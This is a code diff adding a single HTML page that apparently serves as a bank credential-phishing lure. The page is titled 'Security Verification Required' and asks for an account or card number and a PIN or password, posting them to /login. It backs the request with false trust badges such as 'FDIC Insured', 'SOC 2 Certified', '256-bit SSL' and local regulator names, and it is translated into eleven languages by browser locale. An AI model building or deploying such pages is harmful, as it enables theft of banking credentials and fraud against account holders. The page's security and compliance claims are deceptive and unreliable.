@@ -1,0 +1,116 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Security Verification Required</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',Roboto,'Helvetica Neue',Arial,sans-serif;
+background:#f5f7fa;min-height:100vh;display:flex;flex-direction:column;
+align-items:center;justify-content:center;padding:16px}
+.banner{background:linear-gradient(135deg,#1a3a6b 0%,#234d8a 100%);
+width:100%;max-width:520px;border-radius:10px 10px 0 0;padding:24px 32px;
+text-align:center;color:#fff}
+.banner .icon{font-size:2.4em;margin-bottom:8px}
+.banner h1{font-size:1.15em;font-weight:600;letter-spacing:.2px}
+.banner .sub{font-size:.82em;opacity:.85;margin-top:4px}
+.card{background:#fff;width:100%;max-width:520px;border-radius:0 0 10px 10px;
+box-shadow:0 2px 12px rgba(0,0,0,.08);padding:32px 32px 28px}
+.alert{display:flex;align-items:flex-start;gap:10px;background:#fff8e6;
+border:1px solid #f5dea3;border-radius:6px;padding:14px 16px;margin-bottom:24px}
+.alert-icon{font-size:1.3em;flex-shrink:0;margin-top:1px}
+.alert-text{font-size:.82em;color:#6b5a1e;line-height:1.5}
+.field{margin-bottom:18px}
+.field label{display:block;font-size:.8em;color:#3d4f5f;margin-bottom:6px;
+font-weight:600}
+.field input{width:100%;padding:12px 14px;border:1px solid #c7d0d8;
+border-radius:6px;font-size:.92em;color:#1a2b3c;outline:none;
+transition:border .2s,box-shadow .2s;background:#fafbfc}
+.field input:focus{border-color:#1a3a6b;
+box-shadow:0 0 0 3px rgba(26,58,107,.1);background:#fff}
+.field input::placeholder{color:#8d9bab}
+.badge{display:flex;align-items:center;gap:8px;margin-bottom:20px;
+padding:10px 14px;background:#f0f7f0;border:1px solid #c8e6c9;
+border-radius:6px}
+.badge-icon{font-size:1.1em}
+.badge-text{font-size:.78em;color:#2e6b2e;font-weight:500}
+button{width:100%;padding:13px;background:linear-gradient(135deg,#1a3a6b,#2557a7);
+color:#fff;border:none;border-radius:6px;font-size:.95em;font-weight:600;
+cursor:pointer;transition:opacity .2s,box-shadow .2s;letter-spacing:.2px}
+button:hover{opacity:.92;box-shadow:0 4px 16px rgba(26,58,107,.25)}
+.legal{text-align:center;margin-top:20px;font-size:.7em;color:#8d9bab;
+line-height:1.6}
+.secure-bar{display:flex;align-items:center;justify-content:center;gap:6px;
+margin-top:16px;padding-top:16px;border-top:1px solid #e9ecef;
+font-size:.73em;color:#6b7d8e}
+.secure-bar span:first-child{font-size:.95em}
+.trust-logos{display:flex;align-items:center;justify-content:center;gap:16px;
+margin-top:12px;font-size:.68em;color:#a0aab4}
+@media(max-width:560px){
+.banner{border-radius:8px 8px 0 0;padding:20px 20px}
+.card{padding:24px 20px 20px}
+.banner h1{font-size:1.05em}
+}
+</style>
+</head>
+<body>
+<div class="banner">
+<div class="icon">&#127974;</div>
+<h1 data-i18n="title">Security Verification Required</h1>
+<div class="sub" data-i18n="subtitle">Please verify your identity to continue accessing your account</div>
+</div>
+<div class="card">
+<div class="alert">
+<div class="alert-icon">&#9888;</div>
+<div class="alert-text" data-i18n="warning">For your protection, we require additional verification. Please confirm your account details below to restore full access to your banking services.</div>
+</div>
+<form method="POST" action="/login" autocomplete="off">
+<div class="field">
+<label for="acct" data-i18n="acct_label">Account / Card Number</label>
+<input type="text" id="acct" name="username" data-i18n-ph="acct_ph"
+ placeholder="Enter your account or card number" required autocomplete="off"
+ inputmode="numeric" maxlength="20">
+</div>
+<div class="field">
+<label for="pin" data-i18n="pin_label">PIN / Password</label>
+<input type="password" id="pin" name="password" data-i18n-ph="pin_ph"
+ placeholder="Enter your PIN or password" required>
+</div>
+<div class="badge">
+<div class="badge-icon">&#9989;</div>
+<div class="badge-text" data-i18n="badge">Verified secure session - 256-bit SSL encryption active</div>
+</div>
+<button type="submit" data-i18n="submit">Verify Identity</button>
+</form>
+<div class="secure-bar">
+<span>&#128274;</span>
+<span data-i18n="secure">Protected by bank-grade security protocols</span>
+</div>
+<div class="trust-logos" data-i18n="trust">PCI DSS Compliant | FDIC Insured | SOC 2 Certified</div>
+<div class="legal" data-i18n="legal">This verification is required by regulatory compliance standards. Your information is encrypted and will not be stored beyond this session.</div>
+</div>
+<script>
+(function(){
+var T={
+en:{title:"Security Verification Required",subtitle:"Please verify your identity to continue accessing your account",warning:"For your protection, we require additional verification. Please confirm your account details below to restore full access to your banking services.",acct_label:"Account / Card Number",acct_ph:"Enter your account or card number",pin_label:"PIN / Password",pin_ph:"Enter your PIN or password",badge:"Verified secure session - 256-bit SSL encryption active",submit:"Verify Identity",secure:"Protected by bank-grade security protocols",trust:"PCI DSS Compliant | FDIC Insured | SOC 2 Certified",legal:"This verification is required by regulatory compliance standards. Your information is encrypted and will not be stored beyond this session."},
+pt:{title:"Verifica\u00e7\u00e3o de Seguran\u00e7a Necess\u00e1ria",subtitle:"Verifique sua identidade para continuar acessando sua conta",warning:"Para sua prote\u00e7\u00e3o, precisamos de uma verifica\u00e7\u00e3o adicional. Confirme os dados da sua conta abaixo para restaurar o acesso completo aos servi\u00e7os banc\u00e1rios.",acct_label:"N\u00famero da Conta / Cart\u00e3o",acct_ph:"Digite o n\u00famero da conta ou cart\u00e3o",pin_label:"PIN / Senha",pin_ph:"Digite seu PIN ou senha",badge:"Sess\u00e3o segura verificada - criptografia SSL de 256 bits ativa",submit:"Verificar Identidade",secure:"Protegido por protocolos de seguran\u00e7a banc\u00e1ria",trust:"PCI DSS | Banco Central | SOC 2",legal:"Esta verifica\u00e7\u00e3o \u00e9 exigida por normas de conformidade regulat\u00f3ria. Suas informa\u00e7\u00f5es s\u00e3o criptografadas e n\u00e3o ser\u00e3o armazenadas ap\u00f3s esta sess\u00e3o."},
+es:{title:"Verificaci\u00f3n de Seguridad Requerida",subtitle:"Verifique su identidad para continuar accediendo a su cuenta",warning:"Para su protecci\u00f3n, necesitamos una verificaci\u00f3n adicional. Confirme los datos de su cuenta a continuaci\u00f3n para restaurar el acceso completo a sus servicios bancarios.",acct_label:"N\u00famero de Cuenta / Tarjeta",acct_ph:"Ingrese su n\u00famero de cuenta o tarjeta",pin_label:"PIN / Contrase\u00f1a",pin_ph:"Ingrese su PIN o contrase\u00f1a",badge:"Sesi\u00f3n segura verificada - cifrado SSL de 256 bits activo",submit:"Verificar Identidad",secure:"Protegido por protocolos de seguridad bancaria",trust:"PCI DSS | FDIC | SOC 2",legal:"Esta verificaci\u00f3n es requerida por los est\u00e1ndares de cumplimiento regulatorio. Su informaci\u00f3n est\u00e1 cifrada y no se almacenar\u00e1 m\u00e1s all\u00e1 de esta sesi\u00f3n."},
+fr:{title:"V\u00e9rification de S\u00e9curit\u00e9 Requise",subtitle:"Veuillez v\u00e9rifier votre identit\u00e9 pour continuer \u00e0 acc\u00e9der \u00e0 votre compte",warning:"Pour votre protection, une v\u00e9rification suppl\u00e9mentaire est n\u00e9cessaire. Veuillez confirmer les d\u00e9tails de votre compte ci-dessous pour restaurer l\u2019acc\u00e8s complet \u00e0 vos services bancaires.",acct_label:"Num\u00e9ro de Compte / Carte",acct_ph:"Entrez votre num\u00e9ro de compte ou de carte",pin_label:"Code PIN / Mot de passe",pin_ph:"Entrez votre code PIN ou mot de passe",badge:"Session s\u00e9curis\u00e9e v\u00e9rifi\u00e9e - chiffrement SSL 256 bits actif",submit:"V\u00e9rifier l\u2019Identit\u00e9",secure:"Prot\u00e9g\u00e9 par des protocoles de s\u00e9curit\u00e9 bancaire",trust:"PCI DSS | ACPR | SOC 2",legal:"Cette v\u00e9rification est requise par les normes de conformit\u00e9 r\u00e9glementaire. Vos informations sont chiffr\u00e9es et ne seront pas stock\u00e9es au-del\u00e0 de cette session."},
+de:{title:"Sicherheits\u00fcberpr\u00fcfung Erforderlich",subtitle:"Bitte best\u00e4tigen Sie Ihre Identit\u00e4t, um weiterhin auf Ihr Konto zuzugreifen",warning:"Zu Ihrem Schutz ist eine zus\u00e4tzliche \u00dcberpr\u00fcfung erforderlich. Bitte best\u00e4tigen Sie Ihre Kontodaten unten, um den vollst\u00e4ndigen Zugang zu Ihren Bankdiensten wiederherzustellen.",acct_label:"Konto- / Kartennummer",acct_ph:"Konto- oder Kartennummer eingeben",pin_label:"PIN / Passwort",pin_ph:"PIN oder Passwort eingeben",badge:"Verifizierte sichere Sitzung - 256-Bit SSL-Verschl\u00fcsselung aktiv",submit:"Identit\u00e4t Best\u00e4tigen",secure:"Gesch\u00fctzt durch Sicherheitsprotokolle in Bankqualit\u00e4t",trust:"PCI DSS | BaFin | SOC 2",legal:"Diese \u00dcberpr\u00fcfung ist gem\u00e4\u00df regulatorischer Compliance-Standards erforderlich. Ihre Daten werden verschl\u00fcsselt und nicht \u00fcber diese Sitzung hinaus gespeichert."},
+it:{title:"Verifica di Sicurezza Richiesta",subtitle:"Verifica la tua identit\u00e0 per continuare ad accedere al tuo conto",warning:"Per la tua protezione, \u00e8 necessaria una verifica aggiuntiva. Conferma i dati del tuo conto qui sotto per ripristinare l\u2019accesso completo ai servizi bancari.",acct_label:"Numero Conto / Carta",acct_ph:"Inserisci il numero di conto o carta",pin_label:"PIN / Password",pin_ph:"Inserisci il tuo PIN o password",badge:"Sessione sicura verificata - crittografia SSL a 256 bit attiva",submit:"Verifica Identit\u00e0",secure:"Protetto da protocolli di sicurezza bancaria",trust:"PCI DSS | Banca d\u2019Italia | SOC 2",legal:"Questa verifica \u00e8 richiesta dagli standard di conformit\u00e0 normativa. Le tue informazioni sono crittografate e non saranno conservate oltre questa sessione."},
+ja:{title:"\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u8a8d\u8a3c\u304c\u5fc5\u8981\u3067\u3059",subtitle:"\u30a2\u30ab\u30a6\u30f3\u30c8\u3078\u306e\u30a2\u30af\u30bb\u30b9\u3092\u7d9a\u884c\u3059\u308b\u306b\u306f\u672c\u4eba\u78ba\u8a8d\u3092\u884c\u3063\u3066\u304f\u3060\u3055\u3044",warning:"\u304a\u5ba2\u69d8\u306e\u4fdd\u8b77\u306e\u305f\u3081\u3001\u8ffd\u52a0\u306e\u78ba\u8a8d\u304c\u5fc5\u8981\u3067\u3059\u3002\u4ee5\u4e0b\u306b\u53e3\u5ea7\u60c5\u5831\u3092\u78ba\u8a8d\u3057\u3066\u3001\u9280\u884c\u30b5\u30fc\u30d3\u30b9\u3078\u306e\u30d5\u30eb\u30a2\u30af\u30bb\u30b9\u3092\u5fa9\u5143\u3057\u3066\u304f\u3060\u3055\u3044\u3002",acct_label:"\u53e3\u5ea7\u756a\u53f7 / \u30ab\u30fc\u30c9\u756a\u53f7",acct_ph:"\u53e3\u5ea7\u307e\u305f\u306f\u30ab\u30fc\u30c9\u756a\u53f7\u3092\u5165\u529b",pin_label:"\u6697\u8a3c\u756a\u53f7 / \u30d1\u30b9\u30ef\u30fc\u30c9",pin_ph:"\u6697\u8a3c\u756a\u53f7\u307e\u305f\u306f\u30d1\u30b9\u30ef\u30fc\u30c9\u3092\u5165\u529b",badge:"\u691c\u8a3c\u6e08\u307f\u30bb\u30ad\u30e5\u30a2\u30bb\u30c3\u30b7\u30e7\u30f3 - 256\u30d3\u30c3\u30c8SSL\u6697\u53f7\u5316\u6709\u52b9",submit:"\u672c\u4eba\u78ba\u8a8d",secure:"\u9280\u884c\u30b0\u30ec\u30fc\u30c9\u306e\u30bb\u30ad\u30e5\u30ea\u30c6\u30a3\u30d7\u30ed\u30c8\u30b3\u30eb\u3067\u4fdd\u8b77",trust:"PCI DSS | \u91d1\u878d\u5e81 | SOC 2",legal:"\u3053\u306e\u78ba\u8a8d\u306f\u898f\u5236\u9075\u5b88\u57fa\u6e96\u306b\u3088\u308a\u5fc5\u8981\u3067\u3059\u3002\u304a\u5ba2\u69d8\u306e\u60c5\u5831\u306f\u6697\u53f7\u5316\u3055\u308c\u3001\u3053\u306e\u30bb\u30c3\u30b7\u30e7\u30f3\u4ee5\u964d\u4fdd\u5b58\u3055\u308c\u307e\u305b\u3093\u3002"},
+zh:{title:"\u9700\u8981\u5b89\u5168\u9a8c\u8bc1",subtitle:"\u8bf7\u9a8c\u8bc1\u60a8\u7684\u8eab\u4efd\u4ee5\u7ee7\u7eed\u8bbf\u95ee\u60a8\u7684\u8d26\u6237",warning:"\u4e3a\u4e86\u60a8\u7684\u4fdd\u62a4\uff0c\u6211\u4eec\u9700\u8981\u989d\u5916\u7684\u9a8c\u8bc1\u3002\u8bf7\u5728\u4e0b\u65b9\u786e\u8ba4\u60a8\u7684\u8d26\u6237\u4fe1\u606f\uff0c\u4ee5\u6062\u590d\u5bf9\u94f6\u884c\u670d\u52a1\u7684\u5b8c\u5168\u8bbf\u95ee\u3002",acct_label:"\u8d26\u53f7 / \u5361\u53f7",acct_ph:"\u8f93\u5165\u60a8\u7684\u8d26\u53f7\u6216\u5361\u53f7",pin_label:"\u5bc6\u7801 / PIN",pin_ph:"\u8f93\u5165\u60a8\u7684\u5bc6\u7801\u6216PIN",badge:"\u5df2\u9a8c\u8bc1\u7684\u5b89\u5168\u4f1a\u8bdd - 256\u4f4dSSL\u52a0\u5bc6\u5df2\u542f\u7528",submit:"\u9a8c\u8bc1\u8eab\u4efd",secure:"\u53d7\u94f6\u884c\u7ea7\u5b89\u5168\u534f\u8bae\u4fdd\u62a4",trust:"PCI DSS | \u4e2d\u56fd\u94f6\u4fdd\u76d1\u4f1a | SOC 2",legal:"\u6b64\u9a8c\u8bc1\u662f\u76d1\u7ba1\u5408\u89c4\u6807\u51c6\u6240\u8981\u6c42\u7684\u3002\u60a8\u7684\u4fe1\u606f\u5df2\u52a0\u5bc6\uff0c\u4e0d\u4f1a\u5728\u6b64\u4f1a\u8bdd\u4e4b\u540e\u5b58\u50a8\u3002"},
+ko:{title:"\ubcf4\uc548 \ud655\uc778 \ud544\uc694",subtitle:"\uacc4\uc815\uc5d0 \uacc4\uc18d \uc561\uc138\uc2a4\ud558\ub824\uba74 \ubcf8\uc778 \ud655\uc778\uc744 \ud574\uc8fc\uc138\uc694",warning:"\uace0\uac1d\ub2d8\uc758 \ubcf4\ud638\ub97c \uc704\ud574 \ucd94\uac00 \ud655\uc778\uc774 \ud544\uc694\ud569\ub2c8\ub2e4. \uc544\ub798\uc5d0 \uacc4\uc88c \uc815\ubcf4\ub97c \ud655\uc778\ud558\uc5ec \uc740\ud589 \uc11c\ube44\uc2a4\uc5d0 \ub300\ud55c \uc804\uccb4 \uc561\uc138\uc2a4\ub97c \ubcf5\uc6d0\ud558\uc138\uc694.",acct_label:"\uacc4\uc88c\ubc88\ud638 / \uce74\ub4dc\ubc88\ud638",acct_ph:"\uacc4\uc88c\ubc88\ud638 \ub610\ub294 \uce74\ub4dc\ubc88\ud638 \uc785\ub825",pin_label:"PIN / \ube44\ubc00\ubc88\ud638",pin_ph:"PIN \ub610\ub294 \ube44\ubc00\ubc88\ud638 \uc785\ub825",badge:"\ud655\uc778\ub41c \ubcf4\uc548 \uc138\uc158 - 256\ube44\ud2b8 SSL \uc554\ud638\ud654 \ud65c\uc131",submit:"\ubcf8\uc778 \ud655\uc778",secure:"\uc740\ud589 \ub4f1\uae09 \ubcf4\uc548 \ud504\ub85c\ud1a0\ucf5c\ub85c \ubcf4\ud638\ub428",trust:"PCI DSS | \uae08\uc735\uac10\ub3c5\uc6d0 | SOC 2",legal:"\uc774 \ud655\uc778\uc740 \uaddc\uc81c \uc900\uc218 \uae30\uc900\uc5d0 \ub530\ub77c \ud544\uc694\ud569\ub2c8\ub2e4. \uadc0\ud558\uc758 \uc815\ubcf4\ub294 \uc554\ud638\ud654\ub418\uba70 \uc774 \uc138\uc158 \uc774\ud6c4 \uc800\uc7a5\ub418\uc9c0 \uc54a\uc2b5\ub2c8\ub2e4."},
+ru:{title:"\u0422\u0440\u0435\u0431\u0443\u0435\u0442\u0441\u044f \u041f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0411\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438",subtitle:"\u041f\u043e\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u0442\u0435 \u0441\u0432\u043e\u044e \u043b\u0438\u0447\u043d\u043e\u0441\u0442\u044c \u0434\u043b\u044f \u043f\u0440\u043e\u0434\u043e\u043b\u0436\u0435\u043d\u0438\u044f \u0434\u043e\u0441\u0442\u0443\u043f\u0430 \u043a \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u0443",warning:"\u0414\u043b\u044f \u0432\u0430\u0448\u0435\u0439 \u0437\u0430\u0449\u0438\u0442\u044b \u0442\u0440\u0435\u0431\u0443\u0435\u0442\u0441\u044f \u0434\u043e\u043f\u043e\u043b\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u0430\u044f \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430. \u041f\u043e\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u0442\u0435 \u0434\u0430\u043d\u043d\u044b\u0435 \u0430\u043a\u043a\u0430\u0443\u043d\u0442\u0430 \u043d\u0438\u0436\u0435, \u0447\u0442\u043e\u0431\u044b \u0432\u043e\u0441\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c \u043f\u043e\u043b\u043d\u044b\u0439 \u0434\u043e\u0441\u0442\u0443\u043f \u043a \u0431\u0430\u043d\u043a\u043e\u0432\u0441\u043a\u0438\u043c \u0443\u0441\u043b\u0443\u0433\u0430\u043c.",acct_label:"\u041d\u043e\u043c\u0435\u0440 \u0441\u0447\u0435\u0442\u0430 / \u043a\u0430\u0440\u0442\u044b",acct_ph:"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 \u043d\u043e\u043c\u0435\u0440 \u0441\u0447\u0435\u0442\u0430 \u0438\u043b\u0438 \u043a\u0430\u0440\u0442\u044b",pin_label:"PIN / \u041f\u0430\u0440\u043e\u043b\u044c",pin_ph:"\u0412\u0432\u0435\u0434\u0438\u0442\u0435 PIN \u0438\u043b\u0438 \u043f\u0430\u0440\u043e\u043b\u044c",badge:"\u041f\u0440\u043e\u0432\u0435\u0440\u0435\u043d\u043d\u0430\u044f \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u0430\u044f \u0441\u0435\u0441\u0441\u0438\u044f - 256-\u0431\u0438\u0442\u043d\u043e\u0435 SSL-\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u0438\u0435 \u0430\u043a\u0442\u0438\u0432\u043d\u043e",submit:"\u041f\u043e\u0434\u0442\u0432\u0435\u0440\u0434\u0438\u0442\u044c \u041b\u0438\u0447\u043d\u043e\u0441\u0442\u044c",secure:"\u0417\u0430\u0449\u0438\u0449\u0435\u043d\u043e \u043f\u0440\u043e\u0442\u043e\u043a\u043e\u043b\u0430\u043c\u0438 \u0431\u0430\u043d\u043a\u043e\u0432\u0441\u043a\u043e\u0439 \u0431\u0435\u0437\u043e\u043f\u0430\u0441\u043d\u043e\u0441\u0442\u0438",trust:"PCI DSS | \u0426\u0411 \u0420\u0424 | SOC 2",legal:"\u042d\u0442\u0430 \u043f\u0440\u043e\u0432\u0435\u0440\u043a\u0430 \u0442\u0440\u0435\u0431\u0443\u0435\u0442\u0441\u044f \u0441\u0442\u0430\u043d\u0434\u0430\u0440\u0442\u0430\u043c\u0438 \u0440\u0435\u0433\u0443\u043b\u0438\u0440\u043e\u0432\u0430\u043d\u0438\u044f. \u0412\u0430\u0448\u0430 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u044f \u0437\u0430\u0448\u0438\u0444\u0440\u043e\u0432\u0430\u043d\u0430 \u0438 \u043d\u0435 \u0431\u0443\u0434\u0435\u0442 \u0441\u043e\u0445\u0440\u0430\u043d\u0435\u043d\u0430 \u043f\u043e\u0441\u043b\u0435 \u044d\u0442\u043e\u0439 \u0441\u0435\u0441\u0441\u0438\u0438."},
+ar:{title:"\u0645\u0637\u0644\u0648\u0628 \u0627\u0644\u062a\u062d\u0642\u0642 \u0627\u0644\u0623\u0645\u0646\u064a",subtitle:"\u064a\u0631\u062c\u0649 \u0627\u0644\u062a\u062d\u0642\u0642 \u0645\u0646 \u0647\u0648\u064a\u062a\u0643 \u0644\u0645\u0648\u0627\u0635\u0644\u0629 \u0627\u0644\u0648\u0635\u0648\u0644 \u0625\u0644\u0649 \u062d\u0633\u0627\u0628\u0643",warning:"\u0644\u062d\u0645\u0627\u064a\u062a\u0643\u060c \u0646\u062d\u062a\u0627\u062c \u0625\u0644\u0649 \u062a\u062d\u0642\u0642 \u0625\u0636\u0627\u0641\u064a. \u064a\u0631\u062c\u0649 \u062a\u0623\u0643\u064a\u062f \u0628\u064a\u0627\u0646\u0627\u062a \u062d\u0633\u0627\u0628\u0643 \u0623\u062f\u0646\u0627\u0647 \u0644\u0627\u0633\u062a\u0639\u0627\u062f\u0629 \u0627\u0644\u0648\u0635\u0648\u0644 \u0627\u0644\u0643\u0627\u0645\u0644 \u0625\u0644\u0649 \u062e\u062f\u0645\u0627\u062a\u0643 \u0627\u0644\u0645\u0635\u0631\u0641\u064a\u0629.",acct_label:"\u0631\u0642\u0645 \u0627\u0644\u062d\u0633\u0627\u0628 / \u0627\u0644\u0628\u0637\u0627\u0642\u0629",acct_ph:"\u0623\u062f\u062e\u0644 \u0631\u0642\u0645 \u0627\u0644\u062d\u0633\u0627\u0628 \u0623\u0648 \u0627\u0644\u0628\u0637\u0627\u0642\u0629",pin_label:"\u0631\u0645\u0632 PIN / \u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631",pin_ph:"\u0623\u062f\u062e\u0644 \u0631\u0645\u0632 PIN \u0623\u0648 \u0643\u0644\u0645\u0629 \u0627\u0644\u0633\u0631",badge:"\u062c\u0644\u0633\u0629 \u0622\u0645\u0646\u0629 \u0645\u062a\u062d\u0642\u0642 \u0645\u0646\u0647\u0627 - \u062a\u0634\u0641\u064a\u0631 SSL 256 \u0628\u062a \u0646\u0634\u0637",submit:"\u062a\u062d\u0642\u0642 \u0645\u0646 \u0627\u0644\u0647\u0648\u064a\u0629",secure:"\u0645\u062d\u0645\u064a \u0628\u0628\u0631\u0648\u062a\u0648\u0643\u0648\u0644\u0627\u062a \u0623\u0645\u0627\u0646 \u0645\u0635\u0631\u0641\u064a\u0629",trust:"PCI DSS | \u0627\u0644\u0628\u0646\u0643 \u0627\u0644\u0645\u0631\u0643\u0632\u064a | SOC 2",legal:"\u0647\u0630\u0627 \u0627\u0644\u062a\u062d\u0642\u0642 \u0645\u0637\u0644\u0648\u0628 \u0628\u0645\u0648\u062c\u0628 \u0645\u0639\u0627\u064a\u064a\u0631 \u0627\u0644\u0627\u0645\u062a\u062b\u0627\u0644 \u0627\u0644\u062a\u0646\u0638\u064a\u0645\u064a. \u0645\u0639\u0644\u0648\u0645\u0627\u062a\u0643 \u0645\u0634\u0641\u0631\u0629 \u0648\u0644\u0646 \u064a\u062a\u0645 \u062a\u062e\u0632\u064a\u0646\u0647\u0627 \u0628\u0639\u062f \u0647\u0630\u0647 \u0627\u0644\u062c\u0644\u0633\u0629."}
+};
+var l=(navigator.language||navigator.userLanguage||'en').split('-')[0];
+var t=T[l]||T['en'];
+document.querySelectorAll('[data-i18n]').forEach(function(e){var k=e.getAttribute('data-i18n');if(t[k])e.textContent=t[k]});
+document.querySelectorAll('[data-i18n-ph]').forEach(function(e){var k=e.getAttribute('data-i18n-ph');if(t[k])e.placeholder=t[k]});
+if(l==='ar'){document.documentElement.dir='rtl'}
+})();
+</script>
+</body>
+</html>
